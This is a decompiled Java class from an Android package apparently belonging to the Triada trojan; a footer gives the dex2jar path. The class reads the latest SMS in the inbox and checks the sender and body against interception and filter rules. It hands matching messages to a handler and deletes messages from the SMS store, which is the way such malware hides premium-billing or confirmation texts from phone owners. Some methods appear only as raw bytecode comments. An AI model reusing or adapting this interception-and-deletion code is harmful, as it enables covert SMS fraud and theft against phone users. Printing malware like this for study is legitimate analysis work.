package com.android.essdk.eyou.sms.a;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import com.android.essdk.eyou.a.c;
import com.android.essdk.eyou.b.b;
import com.android.essdk.eyou.e.b;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class a {
  private Context a;
  
  private final ArrayList b = new ArrayList();
  
  private List c = new ArrayList();
  
  private boolean d = true;
  
  private int a(String paramString1, String paramString2) {
    if (paramString1 != null && paramString2 != null) {
      String str = paramString1;
      if (paramString1.startsWith("+86"))
        str = paramString1.substring(3); 
      for (byte b = 0;; b++) {
        if (b < this.b.size()) {
          d d = this.b.get(b);
          if (d != null) {
            paramString1 = d.a();
            String str1 = d.e();
            if (paramString1 != null && !paramString1.trim().equals("") && str1 != null && !str1.trim().equals("") && str.contains(paramString1)) {
              byte b1 = b;
              if (!paramString2.contains(str1))
                continue; 
              return b1;
            } 
          } 
          continue;
        } 
        return -1;
      } 
    } 
    return -1;
  }
  
  private void a(d paramd, String paramString1, String paramString2) {
    if (paramd != null && paramd.b())
      (new b(this, paramd, paramString2, paramString1)).start(); 
  }
  
  private void a(String paramString1, String paramString2, String paramString3, String paramString4) {
    // Byte code:
    //   0: aload_1
    //   1: astore #5
    //   3: aload_1
    //   4: ifnull -> 78
    //   7: aload_1
    //   8: invokevirtual length : ()I
    //   11: bipush #11
    //   13: if_icmpeq -> 28
    //   16: aload_1
    //   17: astore #5
    //   19: aload_1
    //   20: invokevirtual length : ()I
    //   23: bipush #14
    //   25: if_icmpne -> 78
    //   28: aload_1
    //   29: astore #6
    //   31: aload_1
    //   32: ldc '+86'
    //   34: invokevirtual startsWith : (Ljava/lang/String;)Z
    //   37: ifeq -> 47
    //   40: aload_1
    //   41: iconst_3
    //   42: invokevirtual substring : (I)Ljava/lang/String;
    //   45: astore #6
    //   47: aload #6
    //   49: astore #5
    //   51: aload_3
    //   52: ifnull -> 78
    //   55: aload #6
    //   57: astore #5
    //   59: aload_3
    //   60: ldc '+86'
    //   62: invokevirtual startsWith : (Ljava/lang/String;)Z
    //   65: ifeq -> 78
    //   68: aload_3
    //   69: iconst_3
    //   70: invokevirtual substring : (I)Ljava/lang/String;
    //   73: pop
    //   74: aload #6
    //   76: astore #5
    //   78: aload_0
    //   79: aload #5
    //   81: aload_2
    //   82: invokespecial a : (Ljava/lang/String;Ljava/lang/String;)I
    //   85: istore #7
    //   87: iload #7
    //   89: iconst_m1
    //   90: if_icmpeq -> 122
    //   93: aload_0
    //   94: aload #5
    //   96: aload_2
    //   97: aload #4
    //   99: invokespecial b : (Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    //   102: aload_0
    //   103: aload_0
    //   104: getfield b : Ljava/util/ArrayList;
    //   107: iload #7
    //   109: invokevirtual get : (I)Ljava/lang/Object;
    //   112: checkcast com/android/essdk/eyou/sms/a/d
    //   115: aload #5
    //   117: aload_2
    //   118: invokespecial a : (Lcom/android/essdk/eyou/sms/a/d;Ljava/lang/String;Ljava/lang/String;)V
    //   121: return
    //   122: aload_0
    //   123: aload #5
    //   125: aload_2
    //   126: invokespecial b : (Ljava/lang/String;Ljava/lang/String;)Z
    //   129: ifeq -> 121
    //   132: aload_0
    //   133: aload #5
    //   135: aload_2
    //   136: aload #4
    //   138: invokespecial b : (Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    //   141: goto -> 121
  }
  
  private void b(String paramString1, String paramString2, String paramString3) {
    this.a.getContentResolver().delete(Uri.parse("content://sms"), "_id=?", new String[] { paramString3 });
  }
  
  private boolean b(String paramString1, String paramString2) {
    boolean bool1 = false;
    b.a("epay_sms_filter", "判断是否要过滤短信 address=" + paramString1 + " body=" + paramString2);
    if (this.c == null || this.c.size() == 0)
      this.c = b.a().a(this.a); 
    boolean bool2 = bool1;
    if (paramString1 != null) {
      bool2 = bool1;
      if (this.c != null) {
        bool2 = bool1;
        if (this.c.size() > 0)
          for (byte b = 0;; b++) {
            if (b >= this.c.size())
              return bool1; 
            c c = this.c.get(b);
            b.a("FilterReceiveSMS", "过滤号码:" + c.a() + "过滤内容：" + c.b());
            if (c.a(paramString1, paramString2))
              return true; 
          }  
      } 
    } 
    return bool2;
  }
  
  public void a() {
    if (this.c != null) {
      this.c.clear();
      this.c = b.a().a(this.a);
    } 
  }
  
  public void a(Context paramContext) {
    this.a = paramContext;
  }
  
  public void a(d paramd) {
    if (paramd != null)
      this.b.add(paramd); 
  }
  
  public boolean a(String paramString1, String paramString2, String paramString3) {
    // Byte code:
    //   0: ldc 'epay_sms_filter'
    //   2: new java/lang/StringBuilder
    //   5: dup
    //   6: ldc 'interceptSMSFromBroadcast() address='
    //   8: invokespecial <init> : (Ljava/lang/String;)V
    //   11: aload_1
    //   12: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   15: ldc ' body='
    //   17: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   20: aload_2
    //   21: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   24: ldc ' service_center='
    //   26: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   29: aload_3
    //   30: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   33: invokevirtual toString : ()Ljava/lang/String;
    //   36: invokestatic b : (Ljava/lang/String;Ljava/lang/String;)I
    //   39: pop
    //   40: aload_1
    //   41: astore #4
    //   43: aload_1
    //   44: ifnull -> 118
    //   47: aload_1
    //   48: invokevirtual length : ()I
    //   51: bipush #11
    //   53: if_icmpeq -> 68
    //   56: aload_1
    //   57: astore #4
    //   59: aload_1
    //   60: invokevirtual length : ()I
    //   63: bipush #14
    //   65: if_icmpne -> 118
    //   68: aload_1
    //   69: astore #5
    //   71: aload_1
    //   72: ldc '+86'
    //   74: invokevirtual startsWith : (Ljava/lang/String;)Z
    //   77: ifeq -> 87
    //   80: aload_1
    //   81: iconst_3
    //   82: invokevirtual substring : (I)Ljava/lang/String;
    //   85: astore #5
    //   87: aload #5
    //   89: astore #4
    //   91: aload_3
    //   92: ifnull -> 118
    //   95: aload #5
    //   97: astore #4
    //   99: aload_3
    //   100: ldc '+86'
    //   102: invokevirtual startsWith : (Ljava/lang/String;)Z
    //   105: ifeq -> 118
    //   108: aload_3
    //   109: iconst_3
    //   110: invokevirtual substring : (I)Ljava/lang/String;
    //   113: pop
    //   114: aload #5
    //   116: astore #4
    //   118: aload_0
    //   119: aload #4
    //   121: aload_2
    //   122: invokespecial a : (Ljava/lang/String;Ljava/lang/String;)I
    //   125: istore #6
    //   127: iload #6
    //   129: iconst_m1
    //   130: if_icmpeq -> 158
    //   133: aload_0
    //   134: aload_0
    //   135: getfield b : Ljava/util/ArrayList;
    //   138: iload #6
    //   140: invokevirtual get : (I)Ljava/lang/Object;
    //   143: checkcast com/android/essdk/eyou/sms/a/d
    //   146: aload #4
    //   148: aload_2
    //   149: invokespecial a : (Lcom/android/essdk/eyou/sms/a/d;Ljava/lang/String;Ljava/lang/String;)V
    //   152: iconst_1
    //   153: istore #7
    //   155: iload #7
    //   157: ireturn
    //   158: aload_0
    //   159: getfield a : Landroid/content/Context;
    //   162: ifnull -> 181
    //   165: aload_0
    //   166: aload #4
    //   168: aload_2
    //   169: invokespecial b : (Ljava/lang/String;Ljava/lang/String;)Z
    //   172: ifeq -> 181
    //   175: iconst_1
    //   176: istore #7
    //   178: goto -> 155
    //   181: iconst_0
    //   182: istore #7
    //   184: goto -> 155
  }
  
  public void b() {
    Iterator iterator = this.c.iterator();
    while (true) {
      if (!iterator.hasNext())
        return; 
      iterator.next();
    } 
  }
  
  public void c() {
    if (!this.d) {
      this.d = true;
      return;
    } 
    Uri uri = Uri.parse("content://sms/inbox");
    Cursor cursor = this.a.getContentResolver().query(uri, new String[] { "_id", "thread_id", "address", "body", "service_center" }, null, null, "_id DESC LIMIT 1");
    if (cursor != null)
      while (true) {
        if (!cursor.moveToNext()) {
          cursor.close();
          return;
        } 
        String str = cursor.getString(0);
        cursor.getString(1);
        a(cursor.getString(2), cursor.getString(3), cursor.getString(4), str);
      }  
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/sms/a/a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */